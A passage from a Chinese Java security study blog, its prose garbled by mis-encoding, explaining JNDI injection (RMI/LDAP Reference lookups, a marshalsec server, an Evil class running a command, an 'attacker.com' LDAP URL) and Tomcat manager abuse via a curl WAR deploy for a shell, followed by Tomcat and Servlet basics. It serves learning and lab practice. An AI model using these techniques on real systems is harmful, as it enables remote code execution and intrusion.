alt></p><p>å¯ä»¥çœ‹åˆ°ldapå¯¹åº”çš„å®‰å…¨æªæ–½å¹¶éå¼ºåˆ¶çš„ã€‚è¿™ç‚¹éå¸¸æœ‰æ„æ€ã€‚è¿›è€Œå»¶ä¼¸åˆ°æˆ‘ä»¬ä¸‹é¢çš„ä¸€ä¸ªç‰¹ç‚¹</p><p>jndiåœ¨åˆå§‹åŒ–æ—¶,ä¸€å®šè¦åƒdemoä¸­é‚£æ ·é…ç½®ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,<span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥æŒ‡å®šä¸Šä¸‹æ–‡ã€‚ä½†æ˜¯å½“æˆ‘ä»¬ä½¿ç”¨lookup()å¯»æ‰¾å¯¹è±¡æ—¶,æˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–æ ¼å¼çš„åè®®æ¥è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒè®¿é—®å¯¹è±¡ã€‚å…·ä½“å¯ä»¥è·Ÿåˆ°InitialContextç±»çš„getURLOrDefaultInitCtx</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">            <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">        &#125;</span><br><span class="line">        String scheme = getURLScheme(name);</span><br><span class="line">        <span class="keyword">if</span> (scheme != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Context ctx = NamingManager.getURLContext(scheme, myProps);</span><br><span class="line">            <span class="keyword">if</span> (ctx != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ctx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¦‚æœåè®®ä¸ä¸ºç©º,ä¼šé‡æ–°è·å–urlä¸­æŒ‡å®šçš„ç¯å¢ƒã€‚<br>æ‰€ä»¥å¯ä»¥ä¼ é€’<code>ctx.lookup(&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;);</code>è¿™æ ·çš„urlæ¥è¿›è¡Œlookup.(å¹¸å¥½ä¹‹å‰åšhtbå¥½å¥½å­¦äº†ä¸‹ldapâ€¦â€¦).è¿™å°±æ˜¯jndiçš„åŠ¨æ€åè®®è½¬æ¢ç‰¹æ€§ã€‚</p><ul><li>jndi injection</li></ul><p>ç»ˆäºåˆ°æˆ‘ä»¬æ”»å‡»çš„é‡å¤´æˆjndiæ³¨å…¥äº†ã€‚ä¸è¿‡åœ¨æ­£å¼å¼€å§‹å‰æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ä¸‹Referenceç±»çš„ä½¿ç”¨</p><blockquote><p>Javaä¸ºäº†å°†Objectå¯¹è±¡å­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæä¾›äº†Naming ReferenceåŠŸèƒ½ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡ç»‘å®šReferenceå­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæ¯”å¦‚RMIã€LDAPç­‰</p></blockquote><p>å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„å±æ€§ï¼š</p><p>1.classNameï¼šè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å<br>2.classFactoryï¼šåŠ è½½çš„classä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°<br>3.classFactoryLocationï¼šè¿œç¨‹åŠ è½½ç±»çš„åœ°å€ï¼Œæä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯file/ftp/httpç­‰åè®®</p><p>æ‰€ä»¥æˆ‘ä»¬å¼€å§‹jndiæ³¨å…¥æ—¶,å°±å¯ä»¥ä½¿ç”¨åˆ°Referenceç±»çš„åŠŸèƒ½äº†ã€‚jndiä¸­å¯¹è±¡çš„ä¼ é€’å¯ä»¥ä½¿ç”¨åºåˆ—åŒ–ä¹Ÿå¯ä»¥ä½¿ç”¨å¼•ç”¨ã€‚é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬èƒ½å°†æ¶æ„çš„Referenceç±»ç»‘å®šåœ¨RMIæ³¨å†Œè¡¨ä¸­,å¹¶è¯•å…¶å¼•ç”¨æŒ‡å‘æ¶æ„class.å°±èƒ½è¾¾æˆå‘½ä»¤æ‰§è¡Œã€‚(å‰æ:å½“ç”¨æˆ·åœ¨JNDIå®¢æˆ·ç«¯çš„lookup()å‡½æ•°å‚æ•°å¤–éƒ¨å¯æ§æˆ–Referenceç±»æ„é€ æ–¹æ³•çš„classFactoryLocationå‚æ•°å¤–éƒ¨å¯æ§æ—¶)</p><p>å¤ç°çš„è¯å› ä¸ºæˆ‘æœ¬åœ°javaç‰ˆæœ¬çš„é—®é¢˜å¯¼è‡´ä¸èƒ½ç”¨åŸºç¡€çš„jndiæ³¨å…¥payloadæ‰“ã€‚ä¸è¿‡ä¹‹å‰æˆ‘å¤ç°è¿‡<a href="https://bycsec.top/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/#fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">fastjson</a>çš„æ´ã€‚ç”¨çš„å°±æ˜¯rmiçš„æœåŠ¡</p><p>æ–¹æ³•,å¯¹åº”jdk1.8ä»¥ä¸‹çš„,ç›´æ¥ç”¨rmiåš</p><p>JndiClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;<span class="comment">//å¯æ§</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨marshalsecèµ·ä¸€ä¸ªrmiæœåŠ¡<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Evil</code></p><p>å‡†å¤‡çš„Evil.java <code>javac Evil.java</code>ç¼–è¯‘å¥½.å¹¶èµ·ä¸€ä¸ªpython webæœåŠ¡ç›‘å¬åœ¨å¯¹åº”çš„ç«¯å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"touch"</span>,<span class="string">"/tmp/a"</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡æˆ‘å› ä¸ºç‰ˆæœ¬é—®é¢˜æ‰€ä»¥éƒ½å¤±è´¥äº†ã€‚å¯ä»¥çœ‹åˆ°å…¶æŠ›å‡ºçš„com.sun.jndi.rmi.object.trustURLCodebaseé”™è¯¯ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢æåˆ°è¯´ldapã€‚LDAP+Referenceçš„æŠ€å·§è¿œç¨‹åŠ è½½Factoryç±»ä¸å—RMI+Referenceä¸­çš„com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebaseç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥é€‚ç”¨èŒƒå›´æ›´å¹¿ã€‚ä½†åœ¨JDK 8u191ã€7u201ã€6u211ä¹‹åï¼Œcom.sun.jndi.ldap.object.trustURLCodebaseå±æ€§çš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºfalseï¼Œå¯¹LDAP Referenceè¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶ã€‚</p><p>æˆ‘ä»¬æ¢ç”¨ldapçš„å‘½ä»¤è¯•è¯•</p><p>CLIENT.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"ldap://127.0.0.1:1389/aa"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>marshalsecèµ·æœåŠ¡ã€‚evil.classå‡†å¤‡å¼¹shell<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/20.PNG" class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥çœ‹åˆ°ldapçš„ç‰ˆæœ¬ä½¿ç”¨èŒƒå›´ç¡®å®æ¯”rmiæ›´å¹¿ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">ç»•è¿‡é«˜ç‰ˆæœ¬çš„jndiæ³¨å…¥</a>ã€‚å±äºè¿›é˜¶æŠ€å·§äº†ã€‚æš‚æ—¶å…ˆç•™ä¸ªå‘ã€‚ç­‰é‡åˆ°å†å¡«ã€‚</p><h2 id="develop"><a href="#develop" class="headerlink" title="develop"></a>develop</h2><p>ä¸Šé¢åŸºæœ¬ä¸Šæ˜¯æŠŠjavaçš„ä¸€äº›æ¯”è¾ƒåŸºç¡€çš„æ¼æ´æˆ–å¤šæˆ–å°‘å¤ç°å¹¶åˆ†æäº†ä¸€éã€‚æ„Ÿè§‰æ¥è§¦èµ·æ¥è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚ä¸è¿‡æŒ‰ç…§ä¹‹å‰çš„è®¡åˆ’,ç°åœ¨è¦æŠŠjava_webçš„çŸ¥è¯†æ›´æ·±å…¥äº†è§£ä¸‹ã€‚æ–¹ä¾¿è‡ªå·±ä»¥åæ›´ç†Ÿæ‚‰æ–‡ä»¶ç»“æ„æˆ–è€…ç›¸åº”çš„æ–¹æ³•,åŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†å¼€å‘åšè¿›ä¸€æ­¥è€ƒè™‘ã€‚è‡³äºjavaä¸€äº›å¸¸è§æ¼æ´å¦‚jackson,fastjsonä»¥åŠå…¶ä»–ä¸€äº›æ¡†æ¶å¦‚strutsçš„æ¼æ´ç­‰ç­‰æ–¹å‘çš„æ·±å…¥å°±ç•™åˆ°åé¢å…¶ä»–æ–‡ç« é‡Œè®°å½•äº†ã€‚</p><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>webèµ„æºæƒ³è¦è¢«è¿œç¨‹è®¡ç®—æœºè®¿é—®,éƒ½éœ€è¦ä¸€ä¸ªä¸ä¹‹è¿›è¡Œç½‘ç»œé€šä¿¡çš„ç¨‹åºã€‚webæœåŠ¡å™¨å°±æ˜¯è¿™æ ·çš„ç¨‹åºã€‚å¯¹javaè€Œè¨€,æ”¯æŒå…¨éƒ¨JSPä»¥åŠServletè§„èŒƒçš„tomcatæœåŠ¡å™¨æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚tomcatçš„ä¸‹è½½å®‰è£…å°±ä¸å¤šèµ˜è¿°äº†ã€‚æŒ‰ç…§æ•™ç¨‹èµ°å°±å¥½ã€‚</p><p>è¿™é‡Œå¯¹tomcatçš„ä¸€äº›ç»†èŠ‚è¿›è¡Œå™è¿°</p><ul><li><code>$CATALINA_HOME</code></li></ul><p>tomcatçš„æ ¹ç›®å½•ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®<code>$CATALINA_BASE</code>,ä¸ºå¤šä¸ªtomcatå®ä¾‹çš„ä¸ªä½“è®¾å®šå¯¹åº”çš„å±æ€§ã€‚</p><ul><li>path</li></ul><p>/bin<br>å­˜æ”¾ç”¨äºå¯åŠ¨åŠå…³é—­çš„æ–‡ä»¶ï¼Œä»¥åŠå…¶ä»–ä¸€äº›è„šæœ¬ã€‚å…¶ä¸­ï¼ŒUNIX ç³»ç»Ÿä¸“ç”¨çš„ *.sh æ–‡ä»¶åœ¨åŠŸèƒ½ä¸Šç­‰åŒäº Windows ç³»ç»Ÿä¸“ç”¨çš„ *.bat æ–‡ä»¶</p><p>/conf<br>é…ç½®æ–‡ä»¶åŠç›¸å…³çš„ DTDã€‚å…¶ä¸­æœ€é‡è¦çš„æ–‡ä»¶æ˜¯ server.xmlï¼Œè¿™æ˜¯å®¹å™¨çš„ä¸»é…ç½®æ–‡ä»¶<br>å½“ç„¶å…¶ä»–ä¸€äº›æ–‡ä»¶ä¹Ÿå¾ˆé‡è¦ã€‚ä¸ªäººé‡åˆ°è¿‡çš„è¿˜æœ‰catalina.policy,tomcat-users.xml,web.xmlè¿™å‡ ä¸ªé‡è¦é…ç½®æ–‡ä»¶ã€‚</p><p>/log<br>æ—¥å¿—æ–‡ä»¶çš„é»˜è®¤ç›®å½•ã€‚</p><p>/webapps<br>å­˜æ”¾ Web åº”ç”¨çš„ç›¸å…³æ–‡ä»¶ã€‚</p><ul><li>åº”ç”¨éƒ¨ç½²</li></ul><p>åœ¨ Tomcat æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹æ³•éƒ¨ç½² Web åº”ç”¨:1.é™æ€éƒ¨ç½²2.åŠ¨æ€éƒ¨ç½²</p><p>é™æ€éƒ¨ç½²æˆ‘ä»¬åº”è¯¥å¾ˆç†Ÿæ‚‰ã€‚å°±æ˜¯å¸¸è§„çš„å¼€å‘æµç¨‹ã€‚åœ¨å¯åŠ¨ä¹‹å‰å°±å†™å¥½webåº”ç”¨ã€‚ä½†æ˜¯åŠ¨æ€éƒ¨ç½²å¯èƒ½å°±æ¥è§¦çš„ç›¸å¯¹è¾ƒå°‘ã€‚ä½†å…¶å®å°±æ˜¯ä½¿ç”¨tomcatmanagerç›´æ¥æ“ä½œç®¡ç†webåº”ç”¨ã€‚</p><p>å…³äºtomcat managerè¦ç­‰åˆ°ä¸“é—¨è®²manageræ—¶å†ä»”ç»†ç†è§£ã€‚</p><ul><li>ä¸Šä¸‹æ–‡</li></ul><p>ä¸Šä¸‹æ–‡åœ¨ Tomcat ä¸­å…¶å®å°±æ˜¯ Web åº”ç”¨çš„æ„æ€ã€‚<br>ä¸ºäº†åœ¨ Tomcat ä¸­é…ç½®ä¸Šä¸‹æ–‡ï¼Œéœ€è¦ç”¨åˆ°ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ã€‚åœ¨tomcatä¸­å…¶å®å°±æ˜¯xmlæ–‡ä»¶ã€‚<br>ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ä½äºï¼š<br>1.<code>$CATALINA_BASE/conf/[enginename]/[hostname]/[webappname].xml</code><br>2.<code>$CATALINA_BASE/webapps/[webappname]/META-INF/context.xml</code><br>åœ¨ç›®å½• 1 ä¸­çš„æ–‡ä»¶åä¸º <code>[webappname].xml</code>ï¼Œä½†åœ¨ç›®å½• 2 ä¸­ï¼Œæ–‡ä»¶åä¸º context.xmlã€‚å¦‚æœæŸä¸ª Web åº”ç”¨æ²¡æœ‰ç›¸åº”çš„ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ï¼ŒTomcat å°±ä¼šä½¿ç”¨é»˜è®¤å€¼é…ç½®è¯¥åº”ç”¨ã€‚</p><ul><li>Tomcat Manager</li></ul><p>å¾ˆå¤šç”Ÿäº§ç¯å¢ƒéƒ½éå¸¸éœ€è¦ä»¥ä¸‹ç‰¹æ€§ï¼šåœ¨æ— éœ€å…³é—­æˆ–é‡å¯æ•´ä¸ªå®¹å™¨çš„æƒ…å†µä¸‹ï¼Œéƒ¨ç½²æ–°çš„ Web åº”ç”¨æˆ–è€…å–æ¶ˆå¯¹ç°æœ‰åº”ç”¨çš„éƒ¨ç½²ã€‚æˆ–è€…ï¼Œå³ä¾¿åœ¨ Tomcat æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰æŒ‡å®š reloadable çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥è¯·æ±‚é‡æ–°åŠ è½½ç°æœ‰åº”ç”¨ã€‚</p><p>Tomcat ä¸­çš„ Web åº”ç”¨ Manager å°±æ˜¯æ¥è§£å†³è¿™äº›é—®é¢˜çš„ï¼Œå®ƒé»˜è®¤å®‰è£…åœ¨ä¸Šä¸‹æ–‡è·¯å¾„ï¼š/manager ä¸­</p><p>Tomcat ä»¥é»˜è®¤å€¼è¿è¡Œæ˜¯éå¸¸å±é™©çš„ï¼Œå› ä¸ºè¿™èƒ½è®©äº’è”ç½‘ä¸Šçš„ä»»ä½•äººéƒ½å¯ä»¥åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ Manager åº”ç”¨ã€‚å› æ­¤ï¼ŒManager åº”ç”¨è¦æ±‚ä»»ä½•ç”¨æˆ·åœ¨ä½¿ç”¨å‰å¿…é¡»éªŒè¯è‡ªå·±çš„èº«ä»½ï¼Œæä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä»¥åŠç›¸åº”é…ç½®çš„ manager-** è§’è‰²ï¼ˆè§’è‰²åç§°æ ¹æ®æ‰€éœ€çš„åŠŸèƒ½è€Œå®šï¼‰ã€‚å¦å¤–ï¼Œé»˜è®¤ç”¨æˆ·æ–‡ä»¶ï¼ˆ$CATALINA_BASE/conf/tomcat-users.xmlï¼‰ä¸­çš„ç”¨æˆ·åç§°éƒ½æ²¡æœ‰æŒ‡å®šè§’è‰²åç§°ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ä¸èƒ½è®¿é—® Manager åº”ç”¨çš„ã€‚</p><p>è¿™äº›è§’è‰²åç§°ä½äº Manager åº”ç”¨çš„ web.xml æ–‡ä»¶ä¸­ã€‚å¯ç”¨çš„è§’è‰²åŒ…æ‹¬ï¼š</p><blockquote><p>manager-gui èƒ½å¤Ÿè®¿é—® HTML ç•Œé¢ã€‚<br>manager-status åªèƒ½è®¿é—®â€œæœåŠ¡å™¨çŠ¶æ€â€ï¼ˆServer Statusï¼‰é¡µé¢ã€‚<br>manager-script èƒ½å¤Ÿè®¿é—®æ–‡æ¡£ä¸­æè¿°çš„é€‚ç”¨äºå·¥å…·çš„çº¯æ–‡æœ¬ç•Œé¢ï¼Œä»¥åŠâ€æœåŠ¡å™¨çŠ¶æ€â€é¡µé¢ã€‚<br>manager-jmx èƒ½å¤Ÿè®¿é—® JMX ä»£ç†ç•Œé¢ä»¥åŠâ€œæœåŠ¡å™¨çŠ¶æ€â€ï¼ˆServer Statusï¼‰é¡µé¢ã€‚</p></blockquote><p>ä¸ºäº†èƒ½å¤Ÿè®¿é—® Manager åº”ç”¨ï¼Œå¿…é¡»åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å/å¯†ç ç»„åˆï¼Œå¹¶ä¸ºä¹‹æˆäºˆä¸€ç§ manager-** è§’è‰²ï¼Œæˆ–è€…æŠŠä¸€ç§ manager-** è§’è‰²æˆäºˆç°æœ‰çš„ç”¨æˆ·å/å¯†ç ç»„åˆ</p><p>æ¯”è¾ƒå±é™©çš„æƒ…å†µå°±å¦‚ä¹‹å‰æ›¾ç»åšè¿‡å‡ æ¬¡çš„javaé¢˜ä¸­å‡ºç°çš„tomcatå¼±å¯†ç éƒ¨ç½²waræˆ–è€…tomcatå¯†ç æ³„éœ²,å‘½ä»¤è¡Œéƒ¨ç½²warçš„æƒ…å†µä¸€æ ·ã€‚</p><p>æ³¨æ„ä¸€ç‚¹,tomcatæ”¯æŒé€šè¿‡è¯·æ±‚urlè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚<br><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p><p>æ¯”å¦‚æˆ‘åšè¿‡çš„htbæŸé¶æœºä¸­,ç”¨æˆ·å¯†ç æ³„éœ²äº†ã€‚ä½†æ˜¯ç”¨æˆ·æ˜¯admin-gui,manager-scriptæƒé™,æˆ‘ä»¬æ²¡æ³•é€šè¿‡è´¦æˆ·å¯†ç ç™»å½•<code>manager/html</code>æ‰‹åŠ¨éƒ¨ç½²war.ä½†æ˜¯å´å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¥éƒ¨ç½²war getshell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --user <span class="string">'tomcat:xxxx'</span> --upload-file exp.war <span class="string">"http://xxxx:8080/manager/text/deploy=/exp.war"</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡è®¿é—®webç›®å½•expç›´æ¥æ“ä½œshelläº†ã€‚</p><ul><li>å®‰å…¨ç®¡ç†</li></ul><p>Java çš„ SecurityManager èƒ½è®© Web æµè§ˆå™¨åœ¨å®ƒè‡ªèº«çš„æ²™ç›’ä¸­è¿è¡Œå°å‹åº”ç”¨ï¼ˆappletï¼‰ï¼Œä»è€Œå…·æœ‰é˜²æ­¢ä¸å¯ä¿¡ä»£ç è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ä»¥åŠé˜²æ­¢å…¶è¿æ¥åˆ°ä¸»æœºï¼Œè€Œä¸æ˜¯åŠ è½½è¯¥åº”ç”¨çš„ä½ç½®ã€‚<br>SecurityManager èƒ½é˜²æ­¢ä¸å¯ä¿¡çš„å°å‹åº”ç”¨åœ¨ä½ çš„æµè§ˆå™¨ä¸Šè¿è¡Œï¼Œè¿è¡Œ Tomcat æ—¶ï¼Œä½¿ç”¨ SecurityManager ä¹Ÿèƒ½ä¿æŠ¤æœåŠ¡å™¨ï¼Œä½¿å…¶å…å—æœ¨é©¬å‹çš„ appletã€JSPã€JSP Bean ä»¥åŠæ ‡ç­¾åº“çš„ä¾µå®³ï¼Œç”šè‡³ä¹Ÿå¯ä»¥é˜²æ­¢ç”±äºæ— æ„ä¸­çš„ç–å¿½æ‰€é€ æˆçš„é—®é¢˜ã€‚</p><p>å…³äºé€‚ç”¨äº Tomcat çš„æ ‡å‡†ç³»ç»Ÿ SecurityManager æƒé™ç±».åŒ…æ‹¬ä½†ä¸é™äºï¼š<br>1.java.lang.RuntimePermissionâ€”â€”æ§åˆ¶ä¸€äº›ç³»ç»Ÿ/è¿è¡Œæ—¶å‡½æ•°çš„ä½¿ç”¨ï¼Œæ¯”å¦‚ exit() å’Œ exec()ã€‚ å¦å¤–ä¹Ÿæ§åˆ¶åŒ…çš„è®¿é—®/å®šä¹‰ã€‚<br>2.java.io.FilePermissionâ€”â€”æ§åˆ¶å¯¹æ–‡ä»¶å’Œç›®å½•çš„è¯»/å†™/æ‰§è¡Œã€‚<br>3.java.security.AllPermissionâ€”â€”å…è®¸è®¿é—®ä»»ä½•æƒé™ï¼Œä»¿ä½›æ²¡æœ‰ SecurityManagerã€‚<br>â€¦â€¦</p><p>å…¶å¯¹åº”çš„ç­–ç•¥æ–‡ä»¶å°±æ˜¯catalina.policyã€‚</p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servletç®—æ˜¯javawebæ¯”è¾ƒç‰¹è‰²çš„ç¨‹åºäº†ã€‚å®ƒæ˜¯ä½œä¸ºæ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚ä»æŸç§è§’åº¦è®²,ä»–èƒ½è·Ÿphpåšåˆ°çš„åŠŸèƒ½è¿‘ä¹ç±»ä¼¼ã€‚Java ç±»åº“çš„å…¨éƒ¨åŠŸèƒ½å¯¹ Servlet æ¥è¯´éƒ½æ˜¯å¯ç”¨çš„ã€‚å®ƒå¯ä»¥é€šè¿‡ sockets å’Œ RMI æœºåˆ¶ä¸ appletsã€æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶è¿›è¡Œäº¤äº’ã€‚</p><ul><li>Life Cycle</li></ul><p>Servletçš„ç”Ÿå‘½å‘¨æœŸå¯è¢«å®šä¹‰ä¸ºä»åˆ›å»ºç›´åˆ°æ¯ç­çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ä»¥ä¸‹æ˜¯ Servlet éµå¾ªçš„è¿‡ç¨‹ï¼š</p><p>1.é€šè¿‡è°ƒç”¨ init () 